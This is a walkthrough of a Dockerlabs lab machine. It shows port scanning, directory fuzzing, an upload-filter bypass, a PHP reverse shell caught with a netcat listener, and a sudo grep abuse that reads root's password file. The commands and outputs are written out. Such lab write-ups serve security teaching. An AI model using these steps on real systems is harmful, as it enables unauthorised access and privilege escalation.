# Dockerlabs Machine

**Level:** Easy

**Author:** [El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)

------------------
## Scanning & Enumeration 

We perform a general scan with **nmap** on the victim machine's IP to identify the open ports. 

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
________________________________________________
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```

Next, we use **nmap**'s default scripts to gather more information about the discovered ports:

```shell
nmap -sCV -p80 172.17.0.2
________________________________________________
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Dockerlabs
```

We access the website to inspect its content:

![image](https://github.com/user-attachments/assets/b843c726-78b8-4d8f-8292-0f0adbe4572b)

After reviewing the page code and interacting with it, we did not find any relevant information.

We perform **fuzzing** using **gobuster**:

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x html,php,txt,js -b '' -s 200,301
---------------------------------------------------------------------------------
/index.php            (Status: 200) [Size: 8235]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/scripts.js           (Status: 200) [Size: 919]
/upload.php           (Status: 200) [Size: 0]
/machine.php          (Status: 200) [Size: 1361]
```

We discover the **machine.php** and **upload.php** files, as well as the **uploads** directory.

--------------
## Explotation

Upon reviewing the **machine.php** page, we realize that the form allows file uploads:

![image](https://github.com/user-attachments/assets/6a23ecd1-fdf2-46c0-8566-2e97b447704f)

We prepare the [PHP Pentester monkey reverse shell](https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash) and save it as a **PHP** file. 

Note that we set the **172.17.0.1** as the **IP** and **4444** as the **PORT** for the listener.

We try to upload the file and discover the server is restricting uploads to **zip** files

![image](https://github.com/user-attachments/assets/66e941d2-aeeb-40e6-99bc-e5ac58ed30c6)

Next, we capture the request with [Burp Suite](https://portswigger.net/burp/communitydownload) **Proxy** and perform a new **fuzzing** test using **Intruder** to identify additional allowed **PHP** extensions.

![image](https://github.com/user-attachments/assets/542229d9-2438-45ee-bf33-6bcec04b7608)

![image](https://github.com/user-attachments/assets/fa80e0e7-84bc-4a65-a3e7-3749bacc01df)

![image](https://github.com/user-attachments/assets/143d5370-a248-4019-9489-8fa2504f8403)

![image](https://github.com/user-attachments/assets/d8fce90b-0d49-4719-bb81-e1c3698e3c87)

We start a **listener** for the reverse shell using **netcat**: 

```shell
nc -lvnp 4444 
-------------------------------------------------------------------
listening on [any] 4444 ...
```

Next, we execute the **reverse shell** file to gain a shell on the victim's machine.

Note that the uploaded files are located in the **uploads** directory.

![image](https://github.com/user-attachments/assets/33c4d87b-80ef-4126-963a-3ae00cc82588)

```shell
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 48346
Linux 8b47fc7b6b14 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 x86_64 x86_64 GNU/Linux
 22:41:59 up 12:39,  0 user,  load average: 0.10, 0.12, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@8b47fc7b6b14:/$
```
------------------------------
### TTY configuration

We configure the **TTY** for comfortable operation on the console:

```shell
script /dev/null -c bash 
```
After pressing **Ctrl  +  Z**, execute:

```shell
stty raw -echo; fg
reset xterm
stty rows 35 columns 156
export TERM=xterm
export SHELL=bash
```

Adjust **rows** and **columns** to match the attacker's screen dimensions:

```shell
stty size
```

Now you can use **Ctrl+L** to clear the screen and **Ctrl+C** as needed.


------------------------------
## Privileges escalation

We use **sudo -l** to check if we can execute anything as `root`:

```shell
sudo -l
------------------------------------------------
User www-data may run the following commands on 8b47fc7b6b14:
    (root) NOPASSWD: /usr/bin/cut
    (root) NOPASSWD: /usr/bin/grep
```

We can run `cut` and `grep` as `root` using [GTFOBins for cut](https://gtfobins.github.io/gtfobins/cut/#sudo) or [GTFOBins for grep](https://gtfobins.github.io/gtfobins/grep/#sudo).

Note that these binaries do not allow privilege escalation, but they can be used to access a restricted file.

We review the system directories `opt` and `etc` to try to find any interesting files.

```shell
ls /etc/
------------------------------------------------
adduser.conf            cron.daily      gai.conf   init.d         localtime    nsswitch.conf  profile.d  resolv.conf  ssl                sysctl.d
alternatives            debconf.conf    gnutls     issue          login.defs   opt            protocols  rmt          subgid             systemd
apache2                 debian_version  group      issue.net      logrotate.d  os-release     rc0.d      rpc          subgid-            terminfo
apt                     default         group-     kernel         lsb-release  pam.conf       rc1.d      security     subuid             timezone
bash.bashrc             deluser.conf    gshadow    ld.so.cache    machine-id   pam.d          rc2.d      selinux      subuid-            ucf.conf
bindresvport.blacklist  dpkg            gshadow-   ld.so.conf     mime.types   passwd         rc3.d      services     sudo.conf          ufw
ca-certificates         e2scrub.conf    gss        ld.so.conf.d   mke2fs.conf  passwd-        rc4.d      shadow       sudo_logsrvd.conf  update-motd.d
ca-certificates.conf    environment     host.conf  ldap           mtab         perl           rc5.d      shadow-      sudoers            xattr.conf
cloud                   ethertypes      hostname   legal          nanorc       php            rc6.d      shells       sudoers.d
cron.d                  fstab           hosts      libaudit.conf  networks     profile        rcS.d      skel         sysctl.conf
```

```shell
ls /opt/
------------------------------------------------
nota.txt
```

We discovered a file named **nota.txt** located in the **opt** directory.

```shell
cat /opt/nota.txt
------------------------------------------------
Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.
```

Next, we try to access the contents of the **clave.txt** file, but, it is restricted.

```shell
cat /root/clave.txt
------------------------------------------------
cat: /root/clave.txt: Permission denied
```

We then use the [GTFOBins for grep](https://gtfobins.github.io/gtfobins/grep/#sudo) to access the restricted file.

```shell
LFILE=/root/clave.txt
sudo grep '' $LFILE
```

We obtain the **root** password and proceed to authenticate as **root** using **su**

```shell
su root
```

```shell
whoami
----------------
root
```
